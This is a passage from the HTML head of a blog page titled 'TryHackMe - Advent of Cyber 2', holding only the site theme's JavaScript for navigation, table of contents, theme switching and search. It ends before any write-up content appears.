<!DOCTYPE html>
<html lang="es" dir="ltr">

<head prefix="og: http://ogp.me/ns#">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>TryHackMe - Advent of Cyber 2 – sckull</title>
    


  
  <script defer src="/js/fuse.min.94c78ad70b02749822921660cf4e9f0b3701bc0680c421afb784a78228de0275.js"></script>



<script src="/js/enquire.min.dfb99dee1e029d51d6cfb672d847929890b1585402de17f5ed092edd72a688b4.js"></script>

<script defer src="/js/lazysizes.min.31dd6a2d3a1ec0f78a8df007535cf23f03aeb5c70f026e6d6a19dac3b3acc340.js"></script>

<script defer src="/js/helper/getParents.min.1618c696be7c98933f9a92677f518b512a74e55bdbb976b09936b4182e93181b.js"></script>

<script defer src="/js/helper/fadeinout.min.93a331f96194789a542f33690bbe4f0c102c7e78ffc018217f5a1c33010bad91.js"></script>

<script defer src="/js/helper/closest.min.js"></script>
  
<script>
  "use strict";

  
  
  if (window.NodeList && !NodeList.prototype.forEach) {
    NodeList.prototype.forEach = Array.prototype.forEach;
  }

  
  if (!String.prototype.includes) {
    String.prototype.includes = function (search, start) {
      'use strict';

      if (search instanceof RegExp) {
        throw TypeError('first argument must not be a RegExp');
      }
      if (start === undefined) { start = 0; }
      return this.indexOf(search, start) !== -1;
    };
  }

  
  Document.prototype.append = Element.prototype.append = function append() {
    this.appendChild(_mutation(arguments));
  };
  function _mutation(nodes) {
    if (!nodes.length) {
      throw new Error('DOM Exception 8');
    } else if (nodes.length === 1) {
      return typeof nodes[0] === 'string' ? document.createTextNode(nodes[0]) : nodes[0];
    } else {
      var
      fragment = document.createDocumentFragment(),
      length = nodes.length,
      index = -1,
      node;

      while (++index < length) {
        node = nodes[index];

        fragment.appendChild(typeof node === 'string' ? document.createTextNode(node) : node);
      }

      return fragment;
    }
  }

  
  if (!String.prototype.startsWith) {
    String.prototype.startsWith = function (searchString, position) {
      position = position || 0;
      return this.indexOf(searchString, position) === position;
    };
  }
  


  document.addEventListener('DOMContentLoaded', function () {
    
    var navCollapseBtn = document.querySelector('.navbar__burger');
    navCollapseBtn ? navCollapseBtn.addEventListener('click', function (e) {
      var navCollapse = document.querySelector('.navbarm__collapse');

      if (navCollapse) {
        var dataOpen = navCollapse.getAttribute('data-open');

        if (dataOpen === 'true') {
          navCollapse.setAttribute('data-open', 'false');
          navCollapse.style.maxHeight = 0;
          navCollapseBtn.classList.remove('is-active');
        } else {
          navCollapse.setAttribute('data-open', 'true');
          navCollapse.style.maxHeight = navCollapse.scrollHeight + "px";
          navCollapseBtn.classList.add('is-active');
        }
      }
    }) : null;
    


    
    var summaryContainer = document.querySelector('.summary__container');
    var searchResult = document.querySelector('.search-result');
    var searchResultCloseBtn = document.querySelector('.search-result__close');
    searchResultCloseBtn ? searchResultCloseBtn.addEventListener('click', function (e) {
      searchResult.setAttribute('data-display', 'none');
      summaryContainer.setAttribute('data-display', 'block');
    }) : null;
    


    
    document.querySelectorAll('.tab') ? 
    document.querySelectorAll('.tab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var tabLinks = elem.querySelectorAll('.tab__link');
      var tabContents = elem.querySelectorAll('.tab__content');
      var ids = [];

      tabLinks && tabLinks.length > 0 ?
      tabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                tabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              tabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    document.querySelectorAll('.codetab') ? 
    document.querySelectorAll('.codetab').forEach(function(elem, idx) {
      var containerId = elem.getAttribute('id');
      var containerElem = elem;
      var codetabLinks = elem.querySelectorAll('.codetab__link');
      var codetabContents = elem.querySelectorAll('.codetab__content');
      var ids = [];

      codetabLinks && codetabLinks.length > 0 ?
      codetabLinks.forEach(function(link, index, self) {
        link.onclick = function(e) {
          for (var i = 0; i < self.length; i++) {
            if (index === parseInt(i, 10)) {
              if (!self[i].classList.contains('active')) {
                self[i].classList.add('active');
                codetabContents[i].style.display = 'block';
              }
            } else {
              self[i].classList.remove('active');
              codetabContents[i].style.display = 'none';
            }
          }
        }
      }) : null;
    }) : null;
    


    
    var gttBtn = document.getElementById("gtt");
    gttBtn.style.display = "none";
    gttBtn.addEventListener('click', function () {
      if (window.document.documentMode) {
        document.documentElement.scrollTop = 0;
      } else {
        scrollToTop(250);
      }
    });

    function scrollToTop(scrollDuration) {
      var scrollStep = -window.scrollY / (scrollDuration / 15);
      var scrollInterval = setInterval(function () {
        if (window.scrollY != 0) {
          window.scrollBy(0, scrollStep);
        }
        else clearInterval(scrollInterval);
      }, 15);
    }

    var scrollFunction = function () {
      if (document.body.scrollTop > 250 || document.documentElement.scrollTop > 250) {
        gttBtn.style.display = "block";
      } else {
        gttBtn.style.display = "none";
      }
    }
    


    
    var expandBtn = document.querySelectorAll('.expand__button');

    for (let i = 0; i < expandBtn.length; i++) {
      expandBtn[i].addEventListener("click", function () {
        var content = this.nextElementSibling;
        if (content.style.maxHeight) {
          content.style.maxHeight = null;
          this.querySelector('svg').classList.add('expand-icon__right');
          this.querySelector('svg').classList.remove('expand-icon__down');
        } else {
          content.style.maxHeight = content.scrollHeight + "px";
          this.querySelector('svg').classList.remove('expand-icon__right');
          this.querySelector('svg').classList.add('expand-icon__down');
        }
      });
    }
    


    
    var lastScrollTop = window.pageYOffset || document.documentElement.scrollTop;
    var tocElem = document.querySelector('.toc');
    var tableOfContentsElem = tocElem ? tocElem.querySelector('#TableOfContents') : null;
    var toggleTocElem = document.getElementById('toggle-toc');
    var singleContentsElem = document.querySelector('.single__contents');
    var navbar = document.querySelector('.navbar');
    var tocFlexbox = document.querySelector('.toc__flexbox');
    var tocFlexboxOuter = document.querySelector('.toc__flexbox--outer');
    var expandContents = document.querySelectorAll('.expand__content');
    var boxContents = document.querySelectorAll('.box');
    var notAllowedTitleIds = null;

    
    var tocFolding = JSON.parse("null");
    
    var tocLevels = JSON.parse("null");
    
    if (tocLevels) {
      tocLevels = tocLevels.toString();
    } else {
      tocLevels = "h1, h2, h3, h4, h5, h6";
    }

    
    singleContentsElem && singleContentsElem.querySelectorAll(".tab") ?
    singleContentsElem.querySelectorAll(".tab").forEach(function (elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    expandContents ? expandContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    boxContents ? boxContents.forEach(function(elem) {
      elem.querySelectorAll(tocLevels).forEach(function (element) {
        notAllowedTitleIds = Array.isArray(notAllowedTitleIds) ?
          notAllowedTitleIds.concat(element.getAttribute('id')) :
          [element.getAttribute('id')];
      });
    }) : null;

    
    window.onscroll = function () {
      scrollFunction();
      
      var st = window.pageYOffset || document.documentElement.scrollTop;
      if (st > lastScrollTop) { 
        if (st < 250) {
          gttBtn.style.display = "none";
        } else {
          gttBtn.style.display = "block";
        }

        if (st < 45) {
          return null;
        }
        
        if (!navbar.classList.contains('navbar--hide')) {
          navbar.classList.add('navbar--hide');
        } else if (navbar.classList.contains('navbar--show')) {
          navbar.classList.remove('navbar--show');
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }

              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }
              
              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox) {
              tocFlexbox.setAttribute('data-position', '');
              if (!tocFlexbox.classList.contains('hide')) {
                tocFlexbox.classList.add('hide');
              }
            }
            if (tocFlexboxOuter) {
              tocFlexboxOuter.setAttribute('data-position', '');
              if (!tocFlexboxOuter.classList.contains('hide')) {
                tocFlexboxOuter.classList.add('hide');
              }
            }
          }
        }
      } else { 
        if (st < 250) {
          gttBtn.style.display = "none";
        }

        if (navbar.classList.contains('navbar--hide')) {
          navbar.classList.remove('navbar--hide');
        } else if (!navbar.classList.contains('navbar--show')) {
          navbar.classList.add('navbar--show');
        }

        if (singleContentsElem) {
          if (singleContentsElem.querySelectorAll(tocLevels).length > 0) {
            singleContentsElem.querySelectorAll(tocLevels).forEach(function (elem) {
              if (toggleTocElem && !toggleTocElem.checked) {
                return null;
              }
              
              if (notAllowedTitleIds && notAllowedTitleIds.includes(elem.getAttribute('id'))) {
                return null;
              }

              if (document.documentElement.scrollTop >= elem.offsetTop) {
                if (tableOfContentsElem) {
                  var id = elem.getAttribute('id');
                  tocElem.querySelectorAll('a').forEach(function (elem) {
                    elem.classList.remove('active');
                  });
                  tocElem.querySelector('a[href="#' + id + '"]') ?
                    tocElem.querySelector('a[href="#' + id + '"]').classList.add('active') : null;

                  if (false === tocFolding) {
                    
                  } else {
                    tableOfContentsElem.querySelectorAll('ul') ?
                      tableOfContentsElem.querySelectorAll('ul').forEach(function (rootUl) {
                        rootUl.querySelectorAll('li').forEach(function (liElem) {
                          liElem.querySelectorAll('ul').forEach(function (ulElem) {
                            ulElem.style.display = 'none';
                          });
                        });
                      }) : null;
                  }

                  var curElem = tableOfContentsElem.querySelector("[href='#" + id + "']");
                  if (curElem && curElem.nextElementSibling) {
                    curElem.nextElementSibling.style.display = 'block';
                  }
                  getParents(curElem, 'ul') ?
                    getParents(curElem, 'ul').forEach(function (elem) {
                      elem.style.display = 'block';
                    }) : null;
                }
              }
            });
          } else {
            if (tocFlexbox && !tocFlexbox.classList.contains('hide')) {
              tocFlexbox.classList.add('hide');
            }
            if (tocFlexboxOuter && !tocFlexboxOuter.classList.contains('hide')) {
              tocFlexboxOuter.classList.add('hide');
            }
          }
          
        }

        if (tableOfContentsElem && document.documentElement.scrollTop < 250) {
          if (false === tocFolding) {

          } else {
            tableOfContentsElem.querySelector('ul') ?
              tableOfContentsElem.querySelector('ul').querySelectorAll('li').forEach(function (liElem) {
                liElem.querySelectorAll('ul').forEach(function (ulElem) {
                  ulElem.style.display = 'none';
                });
              }) : null;
          }
        }
      }
      lastScrollTop = st <= 0 ? 0 : st;
    };
  


  
    var localTheme = localStorage.getItem('theme');
    var rootEleme = document.getElementById('root');
    var selectThemeElem = document.querySelectorAll('.select-theme');
    var selectThemeItemElem = document.querySelectorAll('.select-theme__item');

    var setMetaColor = function(themeColor) {
      var metaMsapplicationTileColor = document.getElementsByName('msapplication-TileColor')[0];
      var metaThemeColor = document.getElementsByName('theme-color')[0];
      var metaMsapplicationNavbuttonColor = document.getElementsByName('msapplication-navbutton-color')[0];
      var metaAppleMobileWebAappStatusBarStyle = document.getElementsByName('apple-mobile-web-app-status-bar-style')[0];

      if (themeColor.includes('dark')) {
        metaMsapplicationTileColor.setAttribute('content', '#fcfcfa');
        metaThemeColor.setAttribute('content', '#403E41');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#403E41');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#403E41');
      } else if (themeColor.includes('light')) {
        metaMsapplicationTileColor.setAttribute('content', '#555');
        metaThemeColor.setAttribute('content', '#eee');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee');
      } else if (themeColor.includes('hacker')) {
        metaMsapplicationTileColor.setAttribute('content', '#e3cd26');
        metaThemeColor.setAttribute('content', '#252526');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#252526');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#252526');
      } else if (themeColor.includes('solarized')) {
        metaMsapplicationTileColor.setAttribute('content', '#d3af86');
        metaThemeColor.setAttribute('content', '#51412c');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#51412c');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#51412c');
      } else if (themeColor.includes('kimbie')) {
        metaMsapplicationTileColor.setAttribute('content', '#586e75');
        metaThemeColor.setAttribute('content', '#eee8d5');
        metaMsapplicationNavbuttonColor.setAttribute('content', '#eee8d5');
        metaAppleMobileWebAappStatusBarStyle.setAttribute('content', '#eee8d5');
      } 
    }
    
    if (localTheme) {
      selectThemeItemElem ? 
      selectThemeItemElem.forEach(function (elem) {
        if (elem.text.trim() === localTheme) {
          elem.classList.add('is-active');
        } else {
          elem.classList.remove('is-active');
        }
      }) : null;

      setMetaColor(localTheme);
    } else {
      setMetaColor(rootEleme.className);
    }

    selectThemeItemElem ? 
    selectThemeItemElem.forEach(function (v, i) {
      v.addEventListener('click', function (e) {
        var selectedThemeVariant = e.target.text.trim();
        localStorage.setItem('theme', selectedThemeVariant);
        setMetaColor(selectedThemeVariant);

        rootEleme.removeAttribute('class');
        rootEleme.classList.add('theme__' + selectedThemeVariant);
        selectThemeElem.forEach(function(rootElem) {
          rootElem.querySelectorAll('a').forEach(function (elem) {
            if (elem.classList) {
              if (elem.text.trim() === selectedThemeVariant) {
                if (!elem.classList.contains('is-active')) {
                  elem.classList.add('is-active');
                }
              } else {
                if (elem.classList.contains('is-active')) {
                  elem.classList.remove('is-active');
                }
              }
            }
          });
        });

        if (window.mermaid) {
          if (selectedThemeVariant === "dark" || selectedThemeVariant === "hacker") {
            mermaid.initialize({ theme: 'dark' });
            location.reload();
          } else {
            mermaid.initialize({ theme: 'default' });
            location.reload();
          }
        }

        var utterances = document.getElementById('utterances');
        if (utterances) {
          utterances.querySelector('iframe').contentWindow.postMessage({
            type: 'set-theme',
            theme: selectedThemeVariant === "dark" || selectedThemeVariant === "hacker" ? 'photon-dark' : selectedThemeVariant === 'kimbie' ? 'github-dark-orange' : 'github-light',
          }, 'https://utteranc.es');
        }

        var twitterCards = document.querySelectorAll('.twitter-timeline');
        if (twitterCards) {
          window.postMessage({
            type: 'set-twitter-theme',
            theme: selectedThemeVariant === 'light' || selectedThemeVariant === 'solarized' ? 'light' : 'dark',
          });
        }
      });
    }) : null;
  


  
    
    var baseurl = JSON.parse("\"https://sckull.github.io/\"");
    
    var permalink = JSON.parse("\"https://sckull.github.io/posts/aoc2020/\"");
    
    var langprefix = JSON.parse("\"\"");
    var searchResults = null;
    var searchMenu = null;
    var searchText = null;
    
    
    var enableSearch = JSON.parse("true");
    
    var enableSearchHighlight = JSON.parse("true");
    
    var searchResultPosition = JSON.parse("\"side\"");
    
    var sectionType = JSON.parse("\"posts\"");
    
    var kind = JSON.parse("\"page\"");
    
    var fuse = null;

    if (enableSearch) {
      (function initFuse() {
        var xhr = new XMLHttpRequest();
        if (sectionType === "publication" && kind !== "page") {
          xhr.open('GET', permalink + "index.json");
        } else {
          xhr.open('GET', baseurl + langprefix + "/index.json");
        }
        
        xhr.setRequestHeader('Content-Type', 'application/json; charset=utf-8');
        xhr.onload = function () {
          if (xhr.status === 200) {
            fuse = new Fuse(JSON.parse(xhr.response.toString('utf-8')), {
              keys: sectionType.includes('publication') ? ['title', 'abstract'] : ['title', 'description', 'content'],
              includeMatches: enableSearchHighlight,
              shouldSort: true,
              threshold: 0.4,
              location: 0,
              distance: 100,
              maxPatternLength: 32,
              minMatchCharLength: 1,
            });
            window.fuse = fuse;
          }
          else {
            console.error('[' + xhr.status + ']Error:', xhr.statusText);
          }
        };
        xhr.send();
      })();
    }

    function makeLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      
      var a = document.createElement('a');
      a.innerHTML = obj.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.permalink);

      var descDiv = document.createElement('div');
      descDiv.setAttribute('class', 'search-result__item--desc');
      if (obj.description) {
        descDiv.innerHTML = obj.description;
      } else if (obj.content) {
        descDiv.innerHTML = obj.content.substring(0, 225);
      }
      
      li.appendChild(a);
      li.appendChild(descDiv);
      ulElem.appendChild(li);
    }

    function makeHighlightLi(ulElem, obj) {
      var li = document.createElement('li');
      li.className = 'search-result__item';
      var descDiv = null;

      var a = document.createElement('a');
      a.innerHTML = obj.item.title;
      a.setAttribute('class', 'search-result__item--title');
      a.setAttribute('href', obj.item.uri);

      if (obj.matches && obj.matches.length) {
        for (var i = 0; i < obj.matches.length; i++) {
          if ('title' === obj.matches[i].key) {
            a = document.createElement('a');
            a.innerHTML = generateHighlightedText(obj.matches[i].value, obj.matches[i].indices);
            a.setAttribute('class', 'search-result__item--title');
            a.setAttribute('href', obj.item.uri);
          }
          
          if ('description' === obj.matches[i].key) {
            descDiv = document.createElement('div');
            descDiv.setAttribute('class', 'search-result__item--desc');
            descDiv.innerHTML = generateHighlightedText(obj.item.description, obj.matches[i].indices);
          } else if ('content' === obj.matches[i].key) {
            if (!descDiv) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = generateHighlightedText(obj.item.content.substring(0, 150), obj.matches[i].indices);
            }
          } else {
            if (obj.item.description) {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.description;
            } else {
              descDiv = document.createElement('div');
              descDiv.setAttribute('class', 'search-result__item--desc');
              descDiv.innerHTML = obj.item.content.substring(0, 150);
            }
          }
        }

        li.appendChild(a);
        if (descDiv) {
          li.appendChild(descDiv);
        }
        if (li) {
          ulElem.appendChild(li);
        }
      }
    }

    function renderSearchResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');
      
      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          a.setAttribute('href', result.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.title;
          titleDiv.setAttribute('class', 'menu-item__title');

          var descDiv = document.createElement('div');
          descDiv.setAttribute('class', 'menu-item__desc');
          if (result.description) {
            descDiv.innerHTML = result.description;
          } else if (result.content) {
            descDiv.innerHTML = result.content.substring(0, 150);
          }

          li.appendChild(titleDiv);
          li.appendChild(descDiv);
          ul.appendChild(a);
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      
      searchMenu.appendChild(ul);
    }

    function renderSearchHighlightResultsSide(searchText, results) {
      searchResults = document.getElementById('search-results');
      searchMenu = document.getElementById('search-menu');
      searchResults.setAttribute('class', 'dropdown is-active');

      var ul = document.createElement('ul');
      ul.setAttribute('class', 'dropdown-content search-content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.setAttribute('class', 'dropdown-item');
          a.appendChild(li);

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'menu-item__title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'menu-item__desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'menu-item__desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var li = document.createElement('li');
        li.setAttribute('class', 'dropdown-item');
        li.innerText = 'No results found';
        ul.appendChild(li);
      }

      while (searchMenu.hasChildNodes()) {
        searchMenu.removeChild(
          searchMenu.lastChild
        );
      }
      searchMenu.appendChild(ul);
    }

    function renderSearchResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var content = document.createElement('div');
      content.setAttribute('class', 'mobile-search__content');

      if (results.length > 0) {
        results.forEach(function (result) {
          var item = document.createElement('a');
          item.setAttribute('href', result.uri);
          item.innerHTML = '<div class="mobile-search__item"><div class="mobile-search__item--title">📄 ' + result.title + '</div><div class="mobile-search__item--desc">' + (result.description ? result.description : result.content) + '</div></div>';
          content.appendChild(item);
        });
      } else {
        var item = document.createElement('span');
        content.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(content);      
    }

    function renderSearchHighlightResultsMobile(searchText, results) {
      searchResults = document.getElementById('search-mobile-results');

      var ul = document.createElement('div');
      ul.setAttribute('class', 'mobile-search__content');

      if (results.length) {
        results.forEach(function (result) {
          var li = document.createElement('li');
          var a = document.createElement('a');
          var descDiv = null;

          a.setAttribute('href', result.item.uri);
          a.appendChild(li);
          li.setAttribute('class', 'mobile-search__item');

          var titleDiv = document.createElement('div');
          titleDiv.innerHTML = result.item.title;
          titleDiv.setAttribute('class', 'mobile-search__item--title');
          
          if (result.matches && result.matches.length) {
            for (var i = 0; i < result.matches.length; i++) {
              if ('title' === result.matches[i].key) {
                titleDiv.innerHTML = generateHighlightedText(result.matches[i].value, result.matches[i].indices);
              }

              if ('description' === result.matches[i].key) {
                descDiv = document.createElement('div');
                descDiv.setAttribute('class', 'mobile-search__item--desc');
                descDiv.innerHTML = generateHighlightedText(result.item.description, result.matches[i].indices);
              } else if ('content' === result.matches[i].key) {
                if (!descDiv) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = generateHighlightedText(result.item.content.substring(0, 150), result.matches[i].indices);
                }
              } else {
                if (result.item.description) {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.description;
                } else {
                  descDiv = document.createElement('div');
                  descDiv.setAttribute('class', 'mobile-search__item--desc');
                  descDiv.innerHTML = result.item.content.substring(0, 150);
                }
              }
            }
            
            li.appendChild(titleDiv);
            if (descDiv) {
              li.appendChild(descDiv);
            }
            ul.appendChild(a);
          }
        });
      } else {
        var item = document.createElement('span');
        ul.appendChild(item);
      }

      let wrap = document.getElementById('search-mobile-results');
      while (wrap.firstChild) {
        wrap.removeChild(wrap.firstChild)
      }
      searchResults.appendChild(ul);
    }

    function generateHighlightedText(text, regions) {
      if (!regions) {
        return text;
      }

      var content = '', nextUnhighlightedRegionStartingIndex = 0;

      regions.forEach(function(region) {
        if (region[0] === region[1]) {
          return null;
        }
        
        content += '' +
          text.substring(nextUnhighlightedRegionStartingIndex, region[0]) +
          '<span class="search__highlight">' +
            text.substring(region[0], region[1] + 1) +
          '</span>' +
        '';
        nextUnhighlightedRegionStartingIndex = region[1] + 1;
      });

      content += text.substring(nextUnhighlightedRegionStartingIndex);

      return content;
    };

    var searchElem = document.getElementById('search');
    var searchMobile = document.getElementById('search-mobile');
    var searchResultsContainer = document.getElementById('search-results');

    searchElem ?
    searchElem.addEventListener('input', function(e) {
      if (!e.target.value | window.innerWidth < 770) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      
      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }
        
        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function(item) {
          item.addEventListener('mousedown', function(e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    searchElem ? 
    searchElem.addEventListener('blur', function() {
      if (window.innerWidth < 770) {
        return null;
      }
      searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
    }) : null;

    searchElem ? 
    searchElem.addEventListener('click', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }
      if (!e.target.value) {
        searchResultsContainer ? searchResultsContainer.setAttribute('class', 'dropdown') : null;
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);

      if (searchResultPosition === "main") {
        if (enableSearchHighlight) {
          renderSearchHighlightResultsMain(searchText, results);
        } else {
          renderSearchResultsMain(searchText, results);
        }
      } else{
        if (enableSearchHighlight) {
          renderSearchHighlightResultsSide(searchText, results);
        } else {
          renderSearchResultsSide(searchText, results);
        }

        var dropdownItems = searchResultsContainer.querySelectorAll('.dropdown-item');
        dropdownItems ? dropdownItems.forEach(function (item) {
          item.addEventListener('mousedown', function (e) {
            e.target.click();
          });
        }) : null;
      }
    }) : null;

    var searchMenuElem = document.getElementById("search-menu");
    var activeItem = document.querySelector('#search-menu .dropdown-item.is-active');
    var activeIndex = null;
    var items = null;
    var searchContainerMaxHeight = 350;

    searchElem ? 
    searchElem.addEventListener('keydown', function(e) {
      if (window.innerWidth < 770) {
        return null;
      }

      if (e.key === 'Escape') {
        searchResult ? searchResult.setAttribute('data-display', 'none') : null;
        summaryContainer ? summaryContainer.setAttribute('data-display', 'block') : null;
      }

      var items = document.querySelectorAll('#search-menu .dropdown-item');
      var keyCode = e.which || e.keyCode;

      if (!items || !items.length) {
        return null;
      }
      
      if (e.key === 'ArrowDown' || keyCode === 40) {
        if (activeIndex === null) {
          activeIndex = 0;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === items.length - 1 ? 0 : activeIndex + 1;
        }
        items[activeIndex].classList.add('is-active');

        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel > 0) {
          document.querySelector(".search-content").scrollTop += items[activeIndex].getBoundingClientRect().height;
        } else if (activeIndex === 0) {
          document.querySelector(".search-content").scrollTop = 0;
        }
      } else if (e.key === 'ArrowUp' || keyCode === 38) {
        if (activeIndex === null) {
          activeIndex = items.length - 1;
          items[activeIndex].classList.remove('is-active');
        } else {
          items[activeIndex].classList.remove('is-active');
          activeIndex = activeIndex === 0 ? items.length - 1 : activeIndex - 1;
        }
        items[activeIndex].classList.add('is-active');
        
        let overflowedPixel = items[activeIndex].offsetTop + items[activeIndex].clientHeight - searchContainerMaxHeight;
        if (overflowedPixel < 0) {
          document.querySelector(".search-content").scrollTop -= items[activeIndex].getBoundingClientRect().height;
        } else {
          document.querySelector(".search-content").scrollTop = overflowedPixel + items[activeIndex].getBoundingClientRect().height;
        }
      } else if (e.key === 'Enter' || keyCode === 13) {
        if (items[activeIndex] && items[activeIndex].getAttribute('href')) {
          location.href = items[activeIndex].getAttribute('href');
        }
      } else if (e.key === 'Escape' || keyCode === 27) {
        e.target.value = null;
        if (searchResults) {
          searchResults.classList.remove('is-active');
        }
      }
    }) : null;

    searchMobile ? 
    searchMobile.addEventListener('input', function(e) {
      if (!e.target.value) {
        let wrap = document.getElementById('search-mobile-results');
        while (wrap.firstChild) {
          wrap.removeChild(wrap.firstChild);
        }
        return null;
      }

      searchText = e.target.value;
      var results = fuse.search(e.target.value);
      renderSearchResultsMobile(searchText, results);
      if (enableSearchHighlight) {
        renderSearchHighlightResultsMobile(searchText, results);
      } else {
        renderSearchResultsMobile(searchText, results);
      }
    }) : null;
  


  
    var mobileSearchInputElem = document.querySelector('#search-mobile');
    var mobileSearchClassElem = document.querySelector('.mobile-search');
    var mobileSearchBtnElem = document.querySelector('#mobileSearchBtn');
    var mobileSearchCloseBtnElem = document.querySelector('#search-mobile-close');
